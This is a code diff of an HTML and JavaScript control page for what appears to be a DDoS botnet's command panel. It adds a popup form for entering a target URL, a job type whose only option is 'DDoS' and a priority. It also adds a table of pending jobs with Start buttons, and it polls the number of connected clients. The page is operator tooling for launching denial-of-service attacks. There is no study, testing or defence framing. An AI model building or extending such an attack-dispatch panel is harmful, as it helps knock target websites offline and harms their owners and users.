@@ -23,17 +23,65 @@
             cursor: pointer;
         }
 
-        ul {
-            list-style-type: none;
-            padding: 0;
-        }
-
-        li {
-            margin-bottom: 5px;
-        }
-
-        .recent-section {
+        table {
+            border-collapse: collapse;
+            width: 100%;
             margin-top: 20px;
+        }
+
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #f2f2f2;
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            display: none;
+        }
+
+        /* Popup container */
+        .popup {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            background: rgba(0, 0, 0, 0.5);
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Popup content */
+        .popup-content {
+            background: #fff;
+            position: relative;
+            padding: 20px;
+            width: 50%;
+            max-width: 400px;
+            margin: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Close button */
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -50,7 +98,7 @@
 <button onclick="getJob()">Get Job</button>
 <p id="jobStatus"></p>
 
-<button onclick="addJob()">Add Job</button>
+<button onclick="openAddJobPopup()">Add Job</button>
 <p id="addJobStatus"></p>
 
 <button onclick="getClientsCount()">Get Clients Count</button>
@@ -62,8 +110,41 @@
 </div>
 
 <div class="recent-section">
-    <h2>Recent Pingers</h2>
-    <ul id="recentPingers"></ul>
+    <h2>Jobs List</h2>
+    <table id="jobsList">
+        <thead>
+            <th>#</th>
+            <th>Job ID</th>
+            <th>Job Type</th>
+            <th>Done</th>
+            <th>Priority</th>
+            <th>URL</th>
+            <th>Action</th>
+        </thead>
+        <tbody></tbody>
+    </table>
+</div>
+
+<div class="notification" id="notification"></div>
+
+<div class="popup" id="addJobPopup">
+    <div class="popup-content">
+        <span class="close" onclick="closeAddJobPopup()">&times;</span>
+        <h2>Add Job</h2>
+        <label for="targetUrl">Target URL:</label>
+        <input type="text" id="targetUrl" name="targetUrl" required>
+        <br>
+        <label for="jobType">Job Type:</label>
+        <select id="jobType" name="jobType" required>
+            <option value="DDoS">DDoS</option>
+            <!-- Add other job types as needed -->
+        </select>
+        <br>
+        <label for="priority">Priority:</label>
+        <input type="number" id="priority" name="priority" min="0" required>
+        <br>
+        <button onclick="addJobFromPopup()">Add Job</button>
+    </div>
 </div>
 
 <script>
@@ -94,23 +175,37 @@
                 if (data.status === "ok") {
                     alert("Job received: " + JSON.stringify(data));
                     updateRecentJobs(data); // Update the recent jobs list
+                    checkJobNotification(data, "started"); // Check for job notification
                 }
             });
     }
 
-    function addJob() {
-        var targetUrl = prompt("Enter target URL for DDoS job:");
-        if (targetUrl) {
+    function openAddJobPopup() {
+        document.getElementById("addJobPopup").style.display = "block";
+    }
+
+    function closeAddJobPopup() {
+        document.getElementById("addJobPopup").style.display = "none";
+    }
+
+    function addJobFromPopup() {
+        const targetUrl = document.getElementById("targetUrl").value;
+        const jobType = document.getElementById("jobType").value;
+        const priority = document.getElementById("priority").value;
+
+        if (targetUrl && jobType && priority !== undefined) {
             fetch("/add_job/", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ job_type: "DDoS", target_url: targetUrl })
+                body: JSON.stringify({ job_type: jobType, target_url: targetUrl, priority: parseInt(priority) })
             })
                 .then(response => response.json())
                 .then(data => {
                     document.getElementById("addJobStatus").innerText = "Add Job Status: " + data.status;
+                    closeAddJobPopup();
+                    checkJobNotification(data, "added"); // Check for job notification
                 });
         }
     }
@@ -135,21 +230,87 @@
         }
     }
 
+    function checkJobNotification(job, action) {
+        const notification = document.getElementById("notification");
+
+        if (action === "started") {
+            notification.textContent = `Job Started: ${job._id}`;
+        } else if (action === "added") {
+            notification.textContent = `Job Added: ${job._id}`;
+        }
+
+        notification.style.backgroundColor = "#4CAF50";
+        notification.style.display = "block";
+        setTimeout(() => {
+            notification.style.display = "none";
+        }, 5000); // Hide after 5 seconds
+    }
+
     function getJobsList() {
         fetch("/get_jobs_list/")
             .then(response => response.json())
             .then(data => {
-                const jobsList = document.getElementById("jobsList");
-                jobsList.innerHTML = "Jobs List:";
+                const jobsList = document.querySelector("#jobsList tbody");
+                jobsList.innerHTML = ""; // Clear existing rows
+
+                let jobNumber = 0;
+
                 data.jobs.forEach(job => {
-                    const listItem = document.createElement("li");
-                    listItem.textContent = JSON.stringify(job);
-                    jobsList.appendChild(listItem);
+                    if (!job.done) {
+                        const row = jobsList.insertRow();
+                        const cell1 = row.insertCell(0);
+                        const cell2 = row.insertCell(1);
+                        const cell3 = row.insertCell(2);
+                        const cell4 = row.insertCell(3);
+                        const cell5 = row.insertCell(4);
+                        const cell6 = row.insertCell(5);
+                        const cell7 = row.insertCell(6);
+
+                        jobNumber++;
+
+                        cell1.textContent = jobNumber;
+                        cell2.textContent = job._id;
+                        cell3.textContent = job.job_type;
+                        cell4.textContent = job.done ? "Yes" : "No";
+                        cell5.textContent = job.priority || 0;
+                        cell6.textContent = job.url;
+
+                        const startButton = document.createElement("button");
+                        startButton.textContent = "Start";
+                        startButton.onclick = function () {
+                            startJob(job._id);
+                        };
+
+                        cell7.appendChild(startButton);
+
+                        if (job.done) {
+                            row.style.display = "none"; // Hide completed jobs
+                        }
+                    }
                 });
             });
     }
 
-    setInterval(getClientsCount, 5000); // Update every 5 seconds (adjust as needed)
+    function startJob(jobId) {
+        fetch(`/start_job/${jobId}`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ start: true })
+        })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("addJobStatus").innerText = "Start Job Status: " + data.status;
+                checkJobNotification(data, "started"); // Check for job notification
+            });
+    }
+
+    // Call getJobsList on load
+    getJobsList();
+
+    setInterval(getClientsCount, 30000); // Update every 5 seconds (adjust as needed)
+    setInterval(getJobsList, 5000);
 
 </script>
 
